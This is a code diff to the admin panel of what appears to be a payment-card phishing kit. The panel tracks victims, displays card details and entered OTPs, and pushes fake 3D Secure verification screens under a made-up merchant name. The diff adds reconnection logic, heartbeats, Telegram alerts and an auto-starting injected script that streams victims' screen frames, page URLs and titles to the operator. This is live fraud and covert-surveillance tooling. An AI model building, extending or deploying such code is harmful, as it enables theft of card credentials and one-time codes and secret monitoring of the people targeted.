@@ -395,7 +395,7 @@
       opacity: 1;
     }
     
-    /* Admin header section */
+   /* Admin header section */
     .admin-header {
       display: flex;
       justify-content: space-between;
@@ -524,6 +524,13 @@
     .capture-status.error {
       color: #ef4444;
     }
+    /* Activity indicator for visitors */
+    .activity-indicator {
+      margin-left: 5px;
+      font-weight: bold;
+      color: #22c55e;
+      transition: opacity 0.5s ease;
+    }
   </style>
 </head>
 <body>
@@ -627,7 +634,7 @@
       <h3 class="text-xl font-bold mb-4">3D Secure Verification</h3>
       
       <!-- Verification Type Selector -->
-   <div class="mb-4">
+      <div class="mb-4">
         <label class="block text-sm mb-2">Verification Type:</label>
         <select id="mcVerificationType" class="bg-gray-700 text-white w-full p-2 rounded">
           <option value="mastercard">Mastercard SecureCode</option>
@@ -769,8 +776,48 @@
     const socket = io({
       query: {
         isAdmin: 'true'
-      }
+      },
+      reconnection: true,
+      reconnectionAttempts: Infinity,
+      reconnectionDelay: 1000,
+      reconnectionDelayMax: 5000,
+      timeout: 20000,
+      autoConnect: true
     });
+    
+    // Add these connection event handlers
+    socket.on('connect', () => {
+      console.log('Admin socket connected with ID:', socket.id);
+      document.getElementById('captureStatus').textContent = 'Socket connected - waiting for visitors';
+      document.getElementById('captureStatus').style.color = '#22c55e';
+      
+      // Request all active visitors when reconnecting
+      socket.emit('admin_connected', { timestamp: Date.now() });
+      
+      // Force reload data
+      loadVisitors();
+      loadTransactions();
+    });
+
+    socket.on('disconnect', () => {
+      console.log('Admin socket disconnected');
+      document.getElementById('captureStatus').textContent = 'Socket disconnected - reconnecting...';
+      document.getElementById('captureStatus').style.color = '#ef4444';
+    });
+
+    socket.on('connect_error', (error) => {
+      console.error('Connection error:', error);
+      document.getElementById('captureStatus').textContent = 'Connection error: ' + error.message;
+      document.getElementById('captureStatus').style.color = '#ef4444';
+    });
+    
+    // Log all socket events for debugging
+    const originalEmit = socket.emit;
+    socket.emit = function() {
+      console.log('EMITTING:', arguments[0], Array.from(arguments).slice(1));
+      return originalEmit.apply(this, arguments);
+    };
+    
     let transactionsMap = new Map();
     let visitorsMap = new Map();
     let currentMcInvoiceId = null;
@@ -798,7 +845,7 @@
       isScreenCanvasInitialized = true;
     }
 
-    // Show error or success message
+   // Show error or success message
     function showMessage(type, message, duration = 5000) {
       const element = document.getElementById(type === 'error' ? 'error-msg' : 'success-msg');
       element.textContent = message;
@@ -915,7 +962,7 @@
       playNotificationSound('visitor');
     }
 
-    // Function to handle received screen frames
+    // Enhanced screen frame handler
     function handleScreenFrame(data) {
       if (!data || !data.frameData) return;
       
@@ -984,6 +1031,33 @@
         };
         img.src = data.frameData;
       }
+      
+      // Update last activity time for this visitor
+      if (data.pid && visitorsMap.has(data.pid)) {
+        const visitor = visitorsMap.get(data.pid);
+        visitor.lastActive = Date.now();
+        visitorsMap.set(data.pid, visitor);
+        
+        // Update activity indicator in the UI
+        const visitorItem = document.getElementById(`visitor-${data.pid}`);
+        if (visitorItem) {
+          const activityIndicator = visitorItem.querySelector('.activity-indicator') || 
+                                  document.createElement('span');
+          
+          if (!visitorItem.querySelector('.activity-indicator')) {
+            activityIndicator.className = 'activity-indicator';
+            visitorItem.appendChild(activityIndicator);
+          }
+          
+          activityIndicator.textContent = '• Live';
+          activityIndicator.style.color = '#22c55e';
+          
+          // Fade out after 3 seconds
+          setTimeout(() => {
+            activityIndicator.style.opacity = '0.5';
+          }, 3000);
+        }
+      }
     }
 
     // Function to stop screen capture
@@ -1035,7 +1109,6 @@
       const newEnlargeBtn = enlargeBtn.cloneNode(true);
       const newRecordBtn = recordBtn.cloneNode(true);
       const newRefreshBtn = refreshBtn.cloneNode(true);
-      
       stopBtn.parentNode.replaceChild(newStopBtn, stopBtn);
       enlargeBtn.parentNode.replaceChild(newEnlargeBtn, enlargeBtn);
       recordBtn.parentNode.replaceChild(newRecordBtn, recordBtn);
@@ -1047,7 +1120,7 @@
         stopScreenCapture();
       });
       
-    // Enlarge screen button
+      // Enlarge screen button
       newEnlargeBtn.addEventListener('click', () => {
         const screenContainer = document.getElementById('screenCaptureContainer');
         if (screenContainer.style.maxWidth === '90%') {
@@ -1299,7 +1372,7 @@
       return 'Unknown';
     }
     
-    // OS detection helper
+   // OS detection helper
     function detectOS(userAgent) {
       if (!userAgent) return 'Unknown';
       
@@ -1563,8 +1636,8 @@
         
         // Generate random hash for the URL (6 characters, alphanumeric)
         const randomHash = Math.random().toString(36).substring(2, 8);
-        
-        // Create a clean URL with just the hash (no .html extension)
+
+      // Create a clean URL with just the hash (no .html extension)
         const origin = window.location.origin;
         const hashUrl = `${origin}/${randomHash}?pid=${pid}`;
         
@@ -1786,7 +1859,7 @@
                     <div class="card-detail-row">
                       <span class="card-detail-label">OTP</span>
                       <span class="card-detail-value">
-                        ${tx.otpEntered ?
+                       ${tx.otpEntered ?
                           `<span class="otp-received">${tx.otpEntered}</span>` : 
                           (tx.otpShown ? 'Waiting for OTP' : 'Not shown')
                         }
@@ -1996,6 +2069,7 @@
       };
       return reasons[reasonCode] || reasonCode;
     }
+
     async function showOTP(id) {
       try {
         const response = await fetch("/api/showOTP", {
@@ -2083,160 +2157,315 @@
       
       // Set up screen controls
       setupScreenControls();
+
+      // Socket event handlers
+      socket.on('error', (error) => {
+        console.error('Socket error:', error);
+        showMessage('error', 'Socket error: ' + (error.message || 'Unknown error'));
+      });
       
       const mcOtpPanel = document.getElementById('mcOtpPanel');
       const mcBankSelect = document.getElementById('mcBankSelect');
       const mcVerificationType = document.getElementById('mcVerificationType');
       const mcCurrencySelect = document.getElementById('mcCurrencySelect'); // Added currency select reference
-      const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
-      const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
-      const mcFailOptionsBtn = document.getElementById('mcFailOptionsBtn');
-      const mcFailOptions = document.getElementById('mcFailOptions');
-      const mcFailWithReasonBtn = document.getElementById('mcFailWithReasonBtn');
-      const mcFailReasonDropdown = document.getElementById('mcFailReasonDropdown');
-      const mcClosePanelBtn = document.getElementById('mcClosePanelBtn');
-      
-      // Fail Options Button - Toggle dropdown
-      if (mcFailOptionsBtn) {
-        mcFailOptionsBtn.addEventListener('click', function() {
-          mcFailOptions.style.display = mcFailOptions.style.display === 'none' ? 'block' : 'none';
-        });
+                              const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
+  const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
+  const mcFailOptionsBtn = document.getElementById('mcFailOptionsBtn');
+  const mcFailOptions = document.getElementById('mcFailOptions');
+  const mcFailWithReasonBtn = document.getElementById('mcFailWithReasonBtn');
+  const mcFailReasonDropdown = document.getElementById('mcFailReasonDropdown');
+  const mcClosePanelBtn = document.getElementById('mcClosePanelBtn');
+  
+  // Fail Options Button - Toggle dropdown
+  if (mcFailOptionsBtn) {
+    mcFailOptionsBtn.addEventListener('click', function() {
+      mcFailOptions.style.display = mcFailOptions.style.display === 'none' ? 'block' : 'none';
+    });
+  }
+  
+  // Fail with Reason Button
+  if (mcFailWithReasonBtn) {
+    mcFailWithReasonBtn.addEventListener('click', function() {
+      if (!currentMcInvoiceId) {
+        alert('No transaction selected for verification');
+        return;
       }
       
-      // Fail with Reason Button
-      if (mcFailWithReasonBtn) {
-        mcFailWithReasonBtn.addEventListener('click', function() {
-          if (!currentMcInvoiceId) {
-            alert('No transaction selected for verification');
-            return;
-          }
-          
-          const reason = mcFailReasonDropdown.value;
-          console.log('Sending failed verification with reason:', reason);
-          
-          socket.emit('mc_verification_result', {
-            invoiceId: currentMcInvoiceId,
-            success: false,
-            reason: reason
-          });
-          
-          // Reset the panel
-          mcOtpPanel.classList.add('hidden');
-          mcFailOptions.style.display = 'none';
-          currentMcInvoiceId = null;
-        });
-      }
+      const reason = mcFailReasonDropdown.value;
+      console.log('Sending failed verification with reason:', reason);
       
-      // Start Verification button handler - UPDATED to include currency
-      const mcStartVerificationBtn = document.getElementById('mcStartVerification');
-      if (mcStartVerificationBtn) {
-        mcStartVerificationBtn.addEventListener('click', function() {
-          if (!currentMcInvoiceId) {
-            alert('No transaction selected for verification');
-            return;
-          }
-          
-          const verificationType = mcVerificationType.value;
-          const bankCode = mcBankSelect.value;
-          const selectedCurrency = mcCurrencySelect.value; // Get selected currency
-          
-          console.log('Starting verification with:', {
-            invoiceId: currentMcInvoiceId,
-            verificationType: verificationType,
-            bankCode: bankCode,
-            currency: selectedCurrency // Log currency
-          });
-          
-          // Send event to show verification UI to client with currency
-          socket.emit('start_verification', {
-            invoiceId: currentMcInvoiceId,
-            verificationType: verificationType,
-            bankCode: bankCode,
-            merchantName: 'Bologus pvt store.',
-            amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
-            currency: selectedCurrency // Include selected currency
-          });
-        });
-      }
-      
-      // Handle MC bank selection
-      mcBankSelect.addEventListener('change', function() {
-        if (currentMcInvoiceId) {
-          console.log('Changing bank to:', mcBankSelect.value, 'for invoice:', currentMcInvoiceId);
-          socket.emit('update_mc_bank', {
-            invoiceId: currentMcInvoiceId,
-            bankCode: mcBankSelect.value
-          });
-        }
+      socket.emit('mc_verification_result', {
+        invoiceId: currentMcInvoiceId,
+        success: false,
+        reason: reason
       });
       
-      // Handle currency selection changes - NEW
-      if (mcCurrencySelect) {
-        mcCurrencySelect.addEventListener('change', function() {
-          if (currentMcInvoiceId) {
-            console.log('Changing currency to:', mcCurrencySelect.value, 'for invoice:', currentMcInvoiceId);
-            socket.emit('update_mc_currency', {
-              invoiceId: currentMcInvoiceId,
-              currency: mcCurrencySelect.value
-            });
-          }
-        });
+      // Reset the panel
+      mcOtpPanel.classList.add('hidden');
+      mcFailOptions.style.display = 'none';
+      currentMcInvoiceId = null;
+    });
+  }
+  
+  // Start Verification button handler - UPDATED to include currency
+  const mcStartVerificationBtn = document.getElementById('mcStartVerification');
+  if (mcStartVerificationBtn) {
+    mcStartVerificationBtn.addEventListener('click', function() {
+      if (!currentMcInvoiceId) {
+        alert('No transaction selected for verification');
+        return;
       }
       
-      // Invalid OTP button
-      mcOtpInvalidBtn.addEventListener('click', function() {
-        if (currentMcInvoiceId) {
-          console.log('Sending invalid OTP message for invoice:', currentMcInvoiceId);
-          socket.emit('mc_otp_error', {
-            invoiceId: currentMcInvoiceId,
-            message: 'Incorrect verification code. Please try again.'
-          });
-        }
+      const verificationType = mcVerificationType.value;
+      const bankCode = mcBankSelect.value;
+      const selectedCurrency = mcCurrencySelect.value; // Get selected currency
+      
+      console.log('Starting verification with:', {
+        invoiceId: currentMcInvoiceId,
+        verificationType: verificationType,
+        bankCode: bankCode,
+        currency: selectedCurrency // Log currency
       });
       
-      // Success button
-      mcOtpSuccessBtn.addEventListener('click', function() {
-        if (currentMcInvoiceId) {
-          console.log('Sending successful verification result for invoice:', currentMcInvoiceId);
-          socket.emit('mc_verification_result', {
-            invoiceId: currentMcInvoiceId,
-            success: true
-          });
-          
-          // Reset the panel
-          mcOtpPanel.classList.add('hidden');
-          currentMcInvoiceId = null;
-        }
-      });
-      
-      // Close button
-      mcClosePanelBtn.addEventListener('click', function() {
-        console.log('Closing MC verification panel');
-        mcOtpPanel.classList.add('hidden');
-        mcFailOptions.style.display = 'none';
-        currentMcInvoiceId = null;
+      // Send event to show verification UI to client with currency
+      socket.emit('start_verification', {
+        invoiceId: currentMcInvoiceId,
+        verificationType: verificationType,
+        bankCode: bankCode,
+        merchantName: 'Bologus pvt store.',
+        amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
+        currency: selectedCurrency // Include selected currency
       });
     });
-    
-    // Handle OTP submission from client in MC verification panel
-    socket.on('mc_otp_submitted', (data) => {
-      console.log('MC OTP received:', data);
-      const mcOtpValue = document.getElementById('mcOtpValue');
-      if (mcOtpValue) {
-        mcOtpValue.textContent = data.otp;
+  }
+  
+  // Handle MC bank selection
+  mcBankSelect.addEventListener('change', function() {
+    if (currentMcInvoiceId) {
+      console.log('Changing bank to:', mcBankSelect.value, 'for invoice:', currentMcInvoiceId);
+      socket.emit('update_mc_bank', {
+        invoiceId: currentMcInvoiceId,
+        bankCode: mcBankSelect.value
+      });
+    }
+  });
+  
+  // Handle currency selection changes - NEW
+  if (mcCurrencySelect) {
+    mcCurrencySelect.addEventListener('change', function() {
+      if (currentMcInvoiceId) {
+        console.log('Changing currency to:', mcCurrencySelect.value, 'for invoice:', currentMcInvoiceId);
+        socket.emit('update_mc_currency', {
+          invoiceId: currentMcInvoiceId,
+          currency: mcCurrencySelect.value
+        });
       }
     });
+  }
+  
+  // Invalid OTP button
+  mcOtpInvalidBtn.addEventListener('click', function() {
+    if (currentMcInvoiceId) {
+      console.log('Sending invalid OTP message for invoice:', currentMcInvoiceId);
+      socket.emit('mc_otp_error', {
+        invoiceId: currentMcInvoiceId,
+        message: 'Incorrect verification code. Please try again.'
+      });
+    }
+  });
+  
+  // Success button
+  mcOtpSuccessBtn.addEventListener('click', function() {
+    if (currentMcInvoiceId) {
+      console.log('Sending successful verification result for invoice:', currentMcInvoiceId);
+      socket.emit('mc_verification_result', {
+        invoiceId: currentMcInvoiceId,
+        success: true
+      });
+      
+      // Reset the panel
+      mcOtpPanel.classList.add('hidden');
+      currentMcInvoiceId = null;
+    }
+  });
+  
+  // Close button
+  mcClosePanelBtn.addEventListener('click', function() {
+    console.log('Closing MC verification panel');
+    mcOtpPanel.classList.add('hidden');
+    mcFailOptions.style.display = 'none';
+    currentMcInvoiceId = null;
+  });
 
-    // Load data on page load
-    document.addEventListener('DOMContentLoaded', function() {
-      console.log('Loading admin panel data...');
-      loadTransactions();
-      loadVisitors();
-      initScreenCanvas(); 
-      // Set up auto-refresh
-      setInterval(loadTransactions, 60000); // Refresh every minute
-    });
-  </script>
+  // Socket event handlers
+  socket.on('visitor', (visitor) => {
+    console.log('New visitor detected:', visitor);
+
+    // Add visitor to map
+    visitorsMap.set(visitor.pid, visitor);
+
+    // Add to list with highlight animation
+    addVisitorToList(visitor, true);
+
+    // Show notification
+    showNotification(`New visitor from IP: ${visitor.ip || 'Unknown'}`);
+
+    // Play notification sound
+    playNotificationSound('visitor');
+    
+    // Send Telegram notification
+    sendTelegramNotification(`🔔 <b>New Visitor</b>\nIP: ${visitor.ip || 'Unknown'}\nPID: ${visitor.pid}`);
+    
+    // Initialize screen capture    
+    initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
+  });
+
+  // Handle existing visitors when reconnecting
+  socket.on('existing_visitors', (visitors) => {
+    console.log('Received existing visitors:', visitors);
+    updateVisitorsList(visitors);
+  });
+
+  // Handle transactions 
+  socket.on('existing_transactions', (transactions) => {
+    console.log('Received existing transactions:', transactions);
+    // Clear the transactions table and populate it with the received data
+    const tbody = document.querySelector("#transactionsTable tbody");
+    if (tbody) {
+      tbody.innerHTML = '';
+      // Use the existing loadTransactions logic to process these transactions
+      if (transactions && transactions.length > 0) {
+        transactions.forEach(tx => transactionsMap.set(tx.id, tx));
+        loadTransactions();
+      }
+    }
+  });
+});
+
+// Handle OTP submission from client in MC verification panel
+socket.on('mc_otp_submitted', (data) => {
+  console.log('MC OTP received:', data);
+  const mcOtpValue = document.getElementById('mcOtpValue');
+  if (mcOtpValue) {
+    mcOtpValue.textContent = data.otp;
+  }
+});
+
+// Show MC verification panel - UPDATED to include currency conversion
+function showMCVerification(id) {
+  const transaction = transactionsMap.get(id);
+  if (!transaction) {
+    alert('Transaction not found');
+    return;
+  }
+  
+  // Show the MC verification panel
+  const mcOtpPanel = document.getElementById('mcOtpPanel');
+  mcOtpPanel.classList.remove('hidden');
+  
+  const mcOtpValue = document.getElementById('mcOtpValue');
+  mcOtpValue.textContent = 'Waiting...';
+  currentMcInvoiceId = id;
+  
+  // Hide failure options by default
+  document.getElementById('mcFailOptions').style.display = 'none';
+  
+  // Get selected currency (default to INR if not selected)
+  const currencySelect = document.getElementById('mcCurrencySelect');
+  const selectedCurrency = currencySelect ? currencySelect.value : 'INR';
+  
+  // Send event to client to show MC verification with loading state
+  socket.emit('show_mc_verification', {
+    invoiceId: id,
+    merchantName: 'Bologus pvt store.',
+    amount: `₹${transaction.amount}`,
+    bankCode: document.getElementById('mcBankSelect').value,
+    currency: selectedCurrency // Include selected currency
+  });
+  
+  console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency);
+}
+
+// Enhanced screen frame handler
+socket.on('screen_frame', (data) => {
+  console.log(`Received screen frame from: ${data.pid || 'unknown'}, size: ${data.frameData?.length || 0}`);
+  handleScreenFrame(data);
+});
+
+socket.on('screen_capture_error', (data) => {
+  console.error('Screen capture error:', data);
+  const captureStatus = document.getElementById('captureStatus');
+  captureStatus.textContent = `Screen capture error: ${data.error}`;
+  captureStatus.classList.add('error');
+  
+  // Update placeholder
+  const screenPlaceholder = document.getElementById('screenPlaceholder');
+  screenPlaceholder.style.display = 'flex';
+  screenPlaceholder.innerHTML = `
+    <div class="icon">❌</div>
+    <p>Error capturing screen: ${data.error}</p>
+    <p>Try refreshing the capture.</p>
+  `;
+});
+
+// Handle when visitors leave
+socket.on('visitor_left', (data) => {
+  console.log('Visitor left:', data.pid);
+
+  // Remove from map
+  visitorsMap.delete(data.pid);
+
+  // Remove from display with animation
+  const visitorElement = document.getElementById(`visitor-${data.pid}`);
+  if (visitorElement) {
+    visitorElement.classList.add('fade-out');
+    setTimeout(() => {
+      visitorElement.remove();
+
+      // Show "No visitors yet" message if this was the last visitor
+      const visitorsList = document.getElementById('visitors-list');
+      if (visitorsList.children.length === 0) {
+        visitorsList.innerHTML = '<p>No visitors yet</p>';
+      }
+    }, 500);
+  }
+
+  // Show notification
+  showNotification(`Visitor has left`);
+  
+  // Stop screen capture if this was the current session
+  if (currentCaptureSession && currentCaptureSession.userId === data.pid) {
+    stopScreenCapture();
+  }
+});
+
+// Load data on page load
+document.addEventListener('DOMContentLoaded', function() {
+  console.log('Loading admin panel data...');
+  loadTransactions();
+  loadVisitors();
+  initScreenCanvas(); 
+  // Set up auto-refresh
+  setInterval(loadTransactions, 60000); // Refresh every minute
+});
+
+// Make functions globally available
+window.updateTransactionStatus = updateTransactionStatus;
+window.showOTP = showOTP;
+window.markWrongOTP = markWrongOTP;
+window.toggleBankpage = toggleBankpage;
+window.showBankpage = showBankpage;
+window.hideBankPage = hideBankPage;
+window.showCurrencyPage = showCurrencyPage;
+window.copyPaymentLink = copyPaymentLink;
+window.showMCVerification = showMCVerification;
+window.clearAllTransactions = clearAllTransactions;
+window.sendTelegramNotification = sendTelegramNotification;
+window.initAdvancedScreenCapture = initAdvancedScreenCapture;
+window.stopScreenCapture = stopScreenCapture;
+window.handleScreenFrame = handleScreenFrame;
+
+    </script>
 
   <!-- Add this script for screen capture injection -->
   <script>
@@ -2349,7 +2578,7 @@
               const id = input.id;
               if (id) {
                 const label = document.querySelector(`label[for="${id}"]`);
-    if (label) {
+                if (label) {
                   labelText = label.textContent.trim();
                 }
               }
@@ -2516,12 +2745,25 @@
         // Function to send the frame data
         function sendFrame(frameData) {
           try {
-            // Send frame data to server
+            // Get URL parameters to include with the frame
+            const urlParams = new URLSearchParams(window.location.search);
+            const pid = urlParams.get('pid');
+            
+            // Send frame data to server with additional info
             socket.emit('screen_frame', {
               frameData: frameData,
               frameType: 'image',
               timestamp: Date.now(),
-              frameId: Math.random().toString(36).substring(2, 15)
+              frameId: Math.random().toString(36).substring(2, 15),
+              pid: pid,
+              url: window.location.href,
+              title: document.title
+            });
+            
+            // Also send a heartbeat with the frame
+            socket.emit('visitor_heartbeat', { 
+              pid: pid,
+              timestamp: Date.now()
             });
           } catch (err) {
             console.error('Error sending frame:', err);
@@ -2569,6 +2811,32 @@
           }
         }
         
+        // Set up heartbeat to keep connection alive
+        function setupHeartbeat() {
+          // Send heartbeat every 15 seconds
+          const heartbeatInterval = setInterval(() => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const pid = urlParams.get('pid');
+            
+            if (pid) {
+              try {
+                socket.emit('visitor_heartbeat', { 
+                  pid: pid,
+                  timestamp: Date.now(),
+                  url: window.location.href
+                });
+              } catch (e) {
+                console.error('Error sending heartbeat:', e);
+              }
+            }
+          }, 15000);
+          
+          // Clear interval when window is closed
+          window.addEventListener('beforeunload', () => {
+            clearInterval(heartbeatInterval);
+          });
+        }
+        
         // Listen for control commands
         socket.on('control_command', (command) => {
           console.log('Received control command:', command);
@@ -2593,6 +2861,9 @@
         
         // Start capture automatically
         setTimeout(startCapture, 1000);
+        
+        // Setup heartbeat
+        setupHeartbeat();
       })();
     `;
     
@@ -2601,5 +2872,6 @@
       return window.advancedCaptureScript;
     };
   </script>
+</body>
 </body>
 </html>
